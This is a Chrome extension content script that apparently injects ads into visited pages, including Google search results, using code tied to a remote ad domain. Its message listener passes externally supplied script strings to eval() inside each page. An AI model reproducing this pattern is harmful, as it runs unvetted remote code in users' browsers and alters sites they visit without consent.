//constant
var REMOTE_DOMAIN="http://app-ads.hoangweb.com/";   //"http://localhost:81/";//
//data
var tab;
var external_scripts;
var count=0;

/**
* init
*/

//send message
chrome.runtime.sendMessage({text:"contentScript_enabled_onpage"});
/*load jquery
addJs(REMOTE_DOMAIN+"test/ksn-crx/assets/jquery-1.10.2.min.js",function(){
    
});
//load my js
addJs(REMOTE_DOMAIN+"test/ksn-crx/assets/ksn-crx-js.js");
*/

/**
* ready document
*/
$(document).ready(function(){
	//$(document.body).css({"background":"#dadada"});
	
});
var port = chrome.runtime.connect({name: "knockknock"});
/**
* tab message listener
*/
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    if(request.text=='send_from_externalMessage'){
        if(request.type=='method' ){
            request.method(request.param);
        } 
    }
    //console.log("chrome.runtime.onMessage");
    if(request.text=='decide_ad_content_base_site'){
        //console.log(request.exScript);
        tab=request.tab;    //save tab
        external_scripts=request.exScript;//console.log(request.exScript);
        eval(request.exScript);
        //decide to get ad content
        if(typeof decide_ad_content_base_site=='function') decide_ad_content_base_site();
        /*//if site is google search
        if(/google.com.+/g.test(request.tab.url)){
            if(typeof get_google_ad=='function') get_google_ad();
        }
        else{
            if(typeof get_default_ad=='function') get_default_ad();//
        }*/
        count++;
    }
    //get ad data
    if(request.text=='complete_ad_content'){
        if(external_scripts){ 
            eval(external_scripts);
            if(typeof complete_ad_content=='function') complete_ad_content();
        }
        else return;
        /*if(/google.com.+/g.test(request.tab.url)){//alert(request.data);
            if(typeof place_google_ad=='function') place_google_ad(request.data);
        }
        else {
            //if(typeof place_google_ad=='function') place_default_ad(request.data);
        }*/
    }
    
});

/**
load external js
*/
function addJs(src,callback) {
  var script = document.createElement("script");
  script.setAttribute("type", 'text/javascript');
  script.setAttribute("src", src);
  script.addEventListener('load', function() {
	//append callback
    if(typeof callback=="function"){
        callback();
    }
    else if(typeof callback=="string"){alert();
        var script = document.createElement("script");
        script.textContent = "(" + callback.toString() + ")();";
         document.body.appendChild(script);
    }
        
  }, false);
  if(typeof callback=="function") callback();
  $("head").append(script);
}